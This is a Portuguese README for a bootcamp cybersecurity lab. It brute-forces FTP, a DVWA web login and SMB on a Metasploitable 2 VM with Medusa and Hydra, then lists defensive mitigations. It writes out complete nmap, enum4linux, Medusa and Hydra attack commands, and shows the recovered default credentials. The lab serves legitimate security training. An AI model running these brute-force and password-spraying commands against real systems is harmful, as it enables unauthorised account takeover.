🌐 **Languages:** [Português](README.md) | [English](README.en.md) | [Español](README.es.md)

# 🛡️ Laboratório de Cibersegurança: Simulação de Ataques de Força Bruta e Mitigações com Medusa

Projeto prático desenvolvido como parte do bootcamp **Santander - Cibersegurança do Zero à Prática** na plataforma [DIO](https://dio.me).

---

## ⚖️ Aviso Legal (Disclaimer)

> **Aviso:** Todo o conteúdo deste laboratório foi executado estritamente em um ambiente isolado e controlado (*Host-Only* no VirtualBox), com o propósito exclusivo de aprendizado técnico em cibersegurança e análise de vulnerabilidades, em conformidade com as boas práticas éticas e a legislação vigente (Lei nº 12.737/2012 - Delitos Informáticos).

---

## 🎯 Objetivos do Projeto

- Configurar e operar um ambiente seguro de testes utilizando o VirtualBox.
- Compreender na prática o funcionamento de ataques de força bruta (*brute force*).
- Utilizar a ferramenta **Medusa** no **Kali Linux** para auditoria de segurança em serviços de rede.
- Documentar processos técnicos e evidências com padrão profissional.
- Propor contramedidas e controles de segurança defensiva (*Blue Team*) para mitigação dos riscos.

---

## 🖥️ Configuração do Ambiente e Reconhecimento Inicial

### Topologia da Rede
| Máquina Virtual | Sistema Operacional | Papel / Função | Endereço IP |
| :--- | :--- | :--- | :--- |
| **Atacante** | Kali Linux | Execução dos testes e auditoria | `192.168.56.102` |
| **Alvo** | Metasploitable 2 | Hospedagem dos serviços vulneráveis | `192.168.56.101` |

Ambas as máquinas foram configuradas em rede interna exclusiva no VirtualBox (*Host-Only Network*).

---

### Etapa 1: Inicialização do Ambiente no VirtualBox
Inicialização e verificação das duas máquinas virtuais em execução na rede isolada.

![Configuração das VMs no VirtualBox](images/ambiente-controlado-metasploitable-kali.png)

---

### Etapa 2: Identificação do Endereço IP do Alvo
No console da máquina vulnerável (Metasploitable 2), foi verificado o endereço IP atribuído:

```bash
ip a
```
> O IP identificado da máquina vulnerável foi `192.168.56.101`.

![Descoberta do IP](images/ip-alvo-metasploitable.png)

---

### Etapa 3: Teste de Conectividade de Rede
A partir da máquina atacante (Kali Linux), foi executado um teste de ping para garantir comunicação com o alvo:

```bash
ping -c 4 192.168.56.101
```

![Teste de Ping](images/teste-ping-atacante-alvo.png)

---

### Etapa 4: Enumeração de Portas e Serviços (Nmap)
Varredura direcionada para identificar as versões dos serviços ativos nas portas que serão objeto dos testes de intrusão:

```bash
nmap -sV -p 21,22,80,445,139 -n 192.168.56.101
```
- `-sV`: Detecta a versão dos serviços em execução.
- `-p 21,22,80,445,139`: Escaneia especificamente os serviços em análise (FTP, SSH, HTTP e SMB).
- `-n`: Desativa a resolução reversa de DNS para otimizar o tempo de resposta na rede local.

![Varredura Nmap](images/enumeracao-alvo.png)

---

## 📂 Cenário 1: Força Bruta no Serviço FTP (Porta 21)

O protocolo FTP (*File Transfer Protocol*) em sua forma tradicional transmite credenciais em texto claro e, quando associado a senhas fracas ou falta de bloqueio de tentativas, torna-se um vetor crítico de intrusão.

---

### Passo 1: Validação Manual do Serviço FTP
Confirmação de que o serviço FTP na porta 21 estava ativo e aceitando conexões de rede:

```bash
ftp 192.168.56.101
```

![Validação do Serviço FTP](images/teste-ftp-ativo-alvo.png)

---

### Passo 2: Criação das Wordlists Personalizadas
Geração de listas personalizadas contendo candidatos a usuários e senhas para o teste:

```bash
# Lista de usuários comuns
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

# Lista de senhas potenciais
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

![Criação das Wordlists](images/criacao-wordlist-users-passwords-ftp.png)

---

### Passo 3: Conferência dos Arquivos de Wordlist
Visualização do conteúdo das listas criadas com o comando `cat`:

```bash
cat users.txt
cat pass.txt
```

![Wordlists Criadas](images/verificacao-wordlist-users-passwords.png)

---

### Passo 4: Ataque de Força Bruta com Medusa
Execução do ataque automatizado de força bruta contra o serviço FTP:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 -f
```
**Parâmetros explicados:**
- `-h 192.168.56.101`: Endereço IP do host alvo.
- `-U users.txt`: Arquivo com a lista de usuários a serem testados.
- `-P pass.txt`: Arquivo com a lista de senhas a serem testadas.
- `-M ftp`: Módulo do Medusa para o protocolo FTP.
- `-t 6`: Execução com 6 threads simultâneas para otimizar o tempo de varredura.
- `-f`: Interrompe a execução assim que encontrar o primeiro par válido de credenciais (*stop on first hit*).

![Execução e Sucesso do Medusa](images/ataque-medusa-ftp.png)

---

### Passo 5: Validação das Credenciais Obtidas
Teste prático de autenticação no serviço FTP com as credenciais descobertas pelo Medusa (`msfadmin:msfadmin`):

```bash
ftp 192.168.56.101
```
> **Resultado:** Acesso autorizado concedido com sucesso ao console FTP do servidor alvo.

![Login com Credenciais Obtidas](images/teste-credenciais-obtidas-medusa-ftp.png)

---

## 📂 Cenário 2: Força Bruta em Formulário Web (DVWA - Porta 80)

Portais de autenticação web são alvos frequentes em auditorias de segurança. Quando desprovidos de mecanismos de controle de taxa, desafios humanos ou tokens de sessão, tornam-se vulneráveis a ataques automatizados de dicionário e força bruta.

Neste cenário, foi auditada a aplicação web **DVWA (Damn Vulnerable Web App)** hospedada na máquina alvo.

---

### Passo 1: Acesso ao Portal Web Alvo
Navegação através do navegador do Kali Linux até o endereço da aplicação vulnerável: `http://192.168.56.101/dvwa/login.php`.

![Página de Login do DVWA](images/pagina-login-dvwa-alvo.png)

---

### Passo 2: Tentativa Manual e Inspeção de Requisições Web (F12)
Para entender como o formulário transmite as credenciais, foram abertas as ferramentas de desenvolvedor do navegador pressionando a tecla **F12**:
1. Acesso à aba **Network** (Rede).
2. Envio de uma tentativa de login com credenciais aleatórias (`username: "teste"` e `password: "senha123"`).
3. Inspeção dos parâmetros enviados via método **POST** no submenu **Request**:
   - `username`: Campo que recebe o usuário (`"teste"`).
   - `password`: Campo que recebe a senha (`"senha123"`).
   - `Login`: Botão de submissão com valor fixo `"Login"`.
4. Identificação da resposta de erro do servidor: mensagem `Login failed` acompanhada de um redirecionamento HTTP com status `302`.

![Inspeção da Requisição HTTP no Navegador](images/tentativa-login-aleatorio-dvwa.png)

---

### Passo 3: Criação e Verificação das Wordlists
Geração e conferência dos arquivos de teste contendo candidatos a usuários e senhas para a aplicação:

```bash
# Criação das listas
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

# Conferência do conteúdo
cat users.txt
cat pass.txt
```

![Criação e Verificação das Wordlists](images/criacao-wordlists-users-passwords-dvwa.png)

---

### Passo 4: Teste Inicial com Medusa e Diagnóstico de Falso Positivo
Foi executada a tentativa de ataque com o Medusa utilizando o módulo `-M http`:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
```

**Diagnóstico Técnico (Falso Positivo):**
O módulo `http` do Medusa é desenvolvido para autenticação básica por cabeçalho HTTP (código 401). Como a aplicação web responde com código `200 OK` (a página HTML do formulário carregada), o Medusa descartou os parâmetros customizados e interpretou todas as requisições como **sucesso**, gerando múltiplos **Falsos Positivos (*False Positives*)**.

![Diagnóstico de Falso Positivo no Medusa](images/falso-positivo-http-dvwa.png)

---

### Passo 5: Diagnóstico do Módulo Web-Form (Erro 302)
Na sequência, foi testado o módulo específico do Medusa para formulários web (`-M web-form`):

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M web-form -m FORM:"dvwa/login.php" -m FORM-DATA:"post?username=&password=&Login=Login" -m DENY-SIGNAL:"Login failed" -t 6
```

**Diagnóstico Técnico:**
O Medusa retornou o erro `ERROR: ... error code 302`. Esse módulo aguarda uma resposta direta em código `200 OK` e não gerencia redirecionamentos HTTP imediatos (`302 Found`), abortando a execução antes de testar as credenciais válidas.

![Erro 302 no Medusa web-form](images/comando-web-form.png)

---

### Passo 6: Ataque de Força Bruta Automatizado com THC-Hydra
Para contornar as limitações de redirecionamento HTTP do Medusa e executar a auditoria de forma fidedigna, foi utilizada a ferramenta **THC-Hydra** com o módulo `http-post-form`:

```bash
hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

**Parâmetros explicados:**
- `-L users.txt`: Testa todos os usuários da lista (abordagem *Black Box*).
- `-P pass.txt`: Testa todas as senhas da lista.
- `192.168.56.101`: Endereço IP do servidor web alvo.
- `http-post-form`: Módulo otimizado para formulários web via requisições HTTP POST.
- `"/dvwa/login.php:..."`: Define o endpoint, os campos de substituição (`^USER^` e `^PASS^`) e a condição de falha (`F=Login failed`).

> **Resultado:** O Hydra executou as 16 combinações possíveis em apenas 2 segundos e identificou com precisão cirúrgica a única credencial válida:  
> **`login: admin` | `password: password`**

![Sucesso no Ataque Web com Hydra](images/ataque-hydra-dvwa.png)

---

### Passo 7: Validação Prática das Credenciais Obtidas
Com as credenciais identificadas pelo Hydra, foi realizado o login prático no portal web do DVWA:

- **Usuário:** `admin`
- **Senha:** `password`

> **Resultado:** Autenticação validada com sucesso, garantindo acesso administrativo ao painel interno da aplicação.

![Login com Sucesso no DVWA](images/teste-credenciais-obtidas-hydra-dvwa.png)

---

## 📂 Cenário 3: Ataque em Cadeia — Enumeração e Password Spraying em SMB (Portas 139/445)

O protocolo SMB (*Server Message Block*) é amplamente utilizado em ambientes corporativos para compartilhamento de arquivos e impressoras. No entanto, configurações permissivas (como permissão de sessões nulas ou enumeração anônima) permitem que um invasor descubra usuários válidos da rede e execute ataques de *Password Spraying* (pulverização de senhas fracas comuns contra múltiplas contas, com o objetivo de evitar o bloqueio por tentativas consecutivas).

---

### Passo 1: Enumeração de Usuários e Compartilhamentos (enum4linux)
Para mapear os usuários legítimos do domínio/servidor sem disparar alertas de autenticação, foi utilizada a ferramenta **enum4linux**, salvando todo o log de saída em arquivo de texto através do comando `tee`:

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```
- `-a`: Executa todas as opções de enumeração disponíveis (usuários, compartilhamentos, políticas de senha e grupos).
- `| tee enum4_output.txt`: Exibe o resultado no terminal e grava simultaneamente no arquivo de texto para análise posterior.

![Execução do enum4linux - Parte 1](images/enumeracao-smb-alvo-1.png)
![Execução do enum4linux - Parte 2](images/enumeracao-smb-alvo-2.png)

---

### Passo 2: Triagem e Análise dos Dados Obtidos
Com o utilitário `less`, foi analisado o arquivo de log para filtrar os nomes de contas de usuários reais encontrados no alvo:

```bash
less enum4_output.txt
```

![Análise dos Resultados - Usuários Mapeados 1](images/analise-usernames-smb-1.png)
![Análise dos Resultados - Usuários Mapeados 2](images/analise-usernames-smb-2.png)
![Análise dos Resultados - Usuários Mapeados 3](images/analise-usernames-smb-3.png)
![Análise dos Resultados - Usuários Mapeados 4](images/analise-usernames-smb-4.png)

---

### Passo 3: Criação e Verificação das Wordlists para Password Spraying
A partir dos usuários identificados (`user`, `msfadmin`, `service`), foram estruturadas wordlists direcionadas contendo as credenciais mapeadas e senhas comuns de teste:

```bash
# Criação da wordlist de usuários descobertos
echo -e "user\nmsfadmin\nservice" > smb_users.txt

# Criação da wordlist de senhas para pulverização
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

# Conferência dos arquivos
cat smb_users.txt
cat senhas_spray.txt
```

![Criação e Conferência das Wordlists SMB](images/criacao-wordlists-users-passwords-smb.png)

---

### Passo 4: Ataque com Medusa (Módulo smbnt)
Execução do ataque automatizado utilizando o módulo NTLM do Medusa para o protocolo SMB:

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

**Parâmetros explicados:**
- `-h 192.168.56.101`: Endereço IP do host alvo.
- `-U smb_users.txt`: Lista de usuários identificados na etapa de enumeração.
- `-P senhas_spray.txt`: Lista de senhas potenciais para teste.
- `-M smbnt`: Módulo do Medusa para autenticação SMB/NTLM.
- `-t 2`: Limite de 2 threads simultâneas para reduzir ruído de rede.
- `-T 50`: Ajuste de temporização/taxa de pacotes para mitigar travamento no serviço de rede.

> **Resultado:** Identificação bem-sucedida do par de credenciais válido para o serviço de compartilhamento:  
> **`ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]`**

![Execução do Medusa contra SMB](images/ataque-medusa-smb.png)

---

### Passo 5: Teste Negativo e Validação Prática com smbclient
Para comprovar a precisão do teste, foram executadas duas validações utilizando a ferramenta nativa `smbclient`:
1. **Teste Negativo (Falha deliberada):** Tentativa de conexão fornecendo uma senha aleatória incorreta, resultando em recusa de acesso imediata (`NT_STATUS_LOGON_FAILURE`).
2. **Teste Positivo (Sucesso com credencial obtida):** Conexão utilizando as credenciais auditadas (`msfadmin:msfadmin`).

```bash
# Validação das credenciais e listagem de compartilhamentos
smbclient -L //192.168.56.101 -U msfadmin
```

> **Resultado:** Listagem autorizada de todos os compartilhamentos administrativos e pastas de rede do servidor (`IPC$`, `print$`, `opt`, etc.).

![Validação de Acesso via smbclient](images/teste-aleatorio-teste-credenciais-obtidas-medusa-smb.png)

---

## 🛡️ Matriz de Mitigação e Defesa em Camadas (Blue Team)

Para neutralizar os vetores de ataque explorados em todos os cenários auditados (FTP, Web e SMB), recomenda-se a aplicação das seguintes salvaguardas baseadas no princípio de **Defesa em Profundidade (*Defense in Depth*)**:

### 1. Controles Globais de Identidade e Acesso
- **Autenticação Multifator (MFA):** Implantação obrigatória de MFA em todas as interfaces de autenticação externas e internas, anulando a eficácia de senhas capturadas por força bruta.
- **Políticas Rígidas de Senhas e Expiração Periódica:** Exigência de senhas longas (mínimo de 12 a 16 caracteres), combinando letras, números e símbolos, associadas à verificação automática contra listas conhecidas de senhas vazadas.
- **Políticas Inteligentes de Bloqueio de Contas (Account Lockout):** Bloqueio temporário (ex.: 15 a 30 minutos) após 3 a 5 tentativas inválidas consecutivas, impedindo rajadas de teste sem causar negação de serviço definitiva (*DoS*).

### 2. Monitoramento Ativo e Detecção com IA (SIEM / SOC)
- **Monitoramento de Logs e Comportamento Anômalo:** Centralização de logs de autenticação em um SIEM corporativo. O uso de mecanismos baseados em Inteligência Artificial / *Machine Learning* permite detectar comportamentos anômalos característicos de *Password Spraying* (uma única senha sendo testada contra diversos usuários em intervalos espaçados).
- **Detecção e Resposta Automatizada:** Bloqueio dinâmico no firewall de endereços IP que apresentem atividade de varredura ou tentativas massivas de login.

### 3. Hardening e Segmentação de Rede
- **Segmentação e Isolamento por Firewall:** Manter serviços sensíveis (como SMB nas portas 139/445 e FTP) restritos a zonas de rede isoladas (*VLANs* administrativas), sem qualquer exposição direta à internet ou a redes de convidados.
- **Desativação de Protocolos Legados:** Descontinuar o uso de protocolos inseguros sem criptografia nativa:
  - Desativar o **FTP** em favor do **SFTP/FTPS**.
  - Desativar versões obsoletas do **SMB (como SMBv1)** e exigir assinaturas digitais obrigatórias (*SMB Signing* e criptografia nativa SMBv3).
- **Bloqueio de Enumeração Anônima (*Null Sessions*):** Configurar o serviço Samba/Windows para rejeitar conexões de convidados anônimos (`restrictanonymous = 2`), impedindo que ferramentas como o `enum4linux` listem os nomes dos usuários do sistema.

### 4. Governança e Auditorias Regulares
- **Varreduras Periódicas de Vulnerabilidades:** Realização rotineira de auditorias internas de segurança (*Vulnerability Assessment*) para identificar serviços ociosos, portas esquecidas e senhas padrão de fábrica antes que invasores o façam.
- **Redução da Superfície de Ataque:** Desativar qualquer serviço ou porta que não desempenhe função essencial nas operações de negócio.

---

## 📚 Conclusão do Laboratório

A realização deste laboratório prático permitiu vivenciar o ciclo completo de uma auditoria técnica de segurança:
1. **Fase de Reconhecimento:** Mapeamento de portas abertas com Nmap e enumeração de usuários com enum4linux.
2. **Fase de Exploração Controlada:** Simulação de ataques de força bruta direta e direcionada contra FTP, Web e SMB, utilizando Medusa e THC-Hydra.
3. **Fase de Validação e Pensamento Crítico:** Diagnóstico prático de limitações de ferramentas, diferenciação de falsos positivos gerados por redirecionamentos HTTP e validação com acessos legítimos.
4. **Fase de Remediação:** Elaboração de um plano defensivo técnico e estratégico, demonstrando que a segurança efetiva não depende de uma única solução, mas da integração equilibrada entre controles técnicos, monitoramento contínuo e conscientização.

---

## 🔗 Referências

- [DIO - Digital Innovation One](https://dio.me)
- [Documentação Oficial do Medusa](http://foofus.net/goons/jmk/medusa/medusa.html)
- [Repositório Oficial do THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Guia do enum4linux - Kali Tools](https://www.kali.org/tools/enum4linux/)
- [OWASP - Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
